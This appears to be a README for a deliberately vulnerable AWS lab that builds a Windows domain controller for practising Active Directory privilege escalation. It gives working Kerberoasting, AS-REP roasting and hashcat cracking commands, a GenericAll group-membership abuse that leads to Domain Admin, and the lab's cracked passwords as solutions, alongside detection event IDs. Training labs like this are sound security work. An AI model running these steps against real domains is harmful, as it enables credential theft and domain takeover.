# Active Directory Privilege Escalation

**Difficulty:** 4/5  
**Provider:** AWS  
**Estimated Time:** 1-2 hours

## Overview

Single Windows Server 2022 domain controller with multiple privilege escalation paths. Initial access via RDP with low-privilege domain credentials.

## Attack Paths

| Path | Technique | Target | Result |
|------|-----------|--------|--------|
| Kerberoast | TGS cracking | svc_backup | Backup Operators membership |
| AS-REP Roast | Pre-auth disabled | j.smith | Domain user credentials |
| ACL Abuse | GenericAll permission | IT Admins group | Domain Admin (via group membership) |

## Architecture

- Windows Server 2022 Domain Controller
- Domain: psychocorp.local (configurable)
- RDP access from allowed IPs
- IMDSv2 optional (not relevant to attack paths)

## Initial Access

RDP into the DC as `PSYCHOCORP\m.johnson` with the password from outputs.

```bash
vault outputs ad-privesc --sensitive
xfreerdp /v:<dc_ip> /u:PSYCHOCORP\\m.johnson /p:<password> /cert:ignore
```

## Attack Walkthrough

### Path 1: Kerberoast

Enumerate SPNs and request TGS tickets:

```powershell
# From attacker machine with domain access
GetUserSPNs.py psychocorp.local/m.johnson:<password> -dc-ip <dc_ip> -request
```

Or from the DC:

```powershell
# Find accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Request TGS (use Rubeus or similar)
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

Crack with hashcat:

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

**svc_backup password:** `Summer2024!`

svc_backup is a member of Backup Operators, enabling volume shadow copy abuse for credential extraction.

### Path 2: AS-REP Roast

Find accounts without pre-authentication:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

Request AS-REP:

```bash
GetNPUsers.py psychocorp.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat
```

Crack:

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

**j.smith password:** `Welcome123`

### Path 3: ACL Abuse

Enumerate ACLs on groups:

```powershell
# Using PowerView
Get-DomainObjectAcl -Identity "IT Admins" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
```

m.johnson has GenericAll on "IT Admins" group. IT Admins is a member of Domain Admins.

Add yourself to the group:

```powershell
Add-ADGroupMember -Identity "IT Admins" -Members m.johnson
```

Verify Domain Admin access:

```powershell
net user m.johnson /domain
```

## Tools

Bring your own tools. Suggested:

- [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos abuse
- [Impacket](https://github.com/fortra/impacket) - GetUserSPNs.py, GetNPUsers.py
- [PowerView](https://github.com/PowerShellMafia/PowerSploit) - AD enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Attack path visualization
- [Hashcat](https://hashcat.net/hashcat/) - Hash cracking

## Detection Opportunities

| Attack | Event ID | Detection |
|--------|----------|-----------|
| Kerberoast | 4769 | TGS requests with RC4 encryption |
| AS-REP Roast | 4768 | Pre-auth failures from unusual sources |
| ACL Abuse | 4728, 5136 | Group membership changes, ACL modifications |

## Cleanup

```bash
vault destroy ad-privesc
```

## Notes

- Allow 10-15 minutes after deployment for AD DS installation
- Check `C:\ad-setup.log` and `C:\ad-configure.log` for setup status
- Windows licensing: uses AWS-provided evaluation license
- Cost: ~$0.05-0.10/hour for t3.medium Windows instance